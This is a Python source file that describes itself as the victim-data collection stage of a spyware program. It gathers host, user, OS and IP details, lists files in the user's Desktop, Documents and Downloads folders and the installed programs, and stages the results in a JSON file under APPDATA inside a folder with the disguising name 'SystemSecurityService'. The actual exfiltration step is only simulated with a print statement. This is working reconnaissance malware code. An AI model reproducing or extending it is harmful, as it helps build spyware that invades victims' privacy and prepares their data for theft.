"""
Auto-Run Function 4: Collect Victim Data
Collects system information, files, and prepares for exfiltration
"""

import os
import platform
import socket
import time
from datetime import datetime
from email.mime.text import MIMEText
from email.mime.multipart import MIMEMultipart
import json

def collect_victim_data(user_email=None):
    """
    Collect comprehensive victim data (system info, files, browser data)
    Args:
        user_email: Optional email address provided by victim
    Returns: Dictionary containing collected data
    """
    print("[Spyware] Function 4: Collecting victim data...")
    
    collected_data = {}
    
    try:
        # === SYSTEM INFORMATION ===
        print("[Spyware]   - Collecting system information...")
        collected_data['system_info'] = {
            'hostname': socket.gethostname(),
            'username': os.getlogin(),
            'os': platform.system(),
            'os_version': platform.version(),
            'os_release': platform.release(),
            'architecture': platform.machine(),
            'processor': platform.processor(),
            'ip_address': socket.gethostbyname(socket.gethostname()),
            'collection_time': datetime.now().strftime("%Y-%m-%d %H:%M:%S"),
            'victim_email': user_email if user_email else "Not provided"
        }
        
        # === FILE SYSTEM INFORMATION ===
        print("[Spyware]   - Scanning user folders...")
        user_folders = {
            'Desktop': os.path.join(os.path.expanduser('~'), 'Desktop'),
            'Documents': os.path.join(os.path.expanduser('~'), 'Documents'),
            'Downloads': os.path.join(os.path.expanduser('~'), 'Downloads'),
        }
        
        collected_data['file_info'] = {}
        for folder_name, folder_path in user_folders.items():
            if os.path.exists(folder_path):
                try:
                    files = os.listdir(folder_path)[:20]  # First 20 files
                    collected_data['file_info'][folder_name] = {
                        'path': folder_path,
                        'file_count': len(os.listdir(folder_path)),
                        'sample_files': files
                    }
                except:
                    collected_data['file_info'][folder_name] = "Access denied"
        
        # === INSTALLED APPLICATIONS ===
        print("[Spyware]   - Detecting installed applications...")
        program_files = os.getenv('PROGRAMFILES')
        if program_files and os.path.exists(program_files):
            try:
                apps = os.listdir(program_files)[:15]  # First 15 apps
                collected_data['installed_apps'] = apps
            except:
                collected_data['installed_apps'] = "Access denied"
        
        # === SAVE COLLECTED DATA ===
        appdata = os.getenv('APPDATA')
        data_file = os.path.join(appdata, "SystemSecurityService", "captured_data", "victim_data.json")
        
        os.makedirs(os.path.dirname(data_file), exist_ok=True)
        with open(data_file, 'w') as f:
            json.dump(collected_data, f, indent=4)
        
        print(f"[Spyware] Data collected and saved to: {data_file}")
        print(f"[Spyware] Total data points: {len(collected_data)} categories")
        
        # Simulate sending to attacker (in reality, would call exfiltration function)
        if user_email:
            print(f"[Spyware] Would exfiltrate data to attacker with victim email: {user_email}")
        
        return collected_data
        
    except Exception as e:
        print(f"[Spyware] Error collecting data: {e}")
        return None
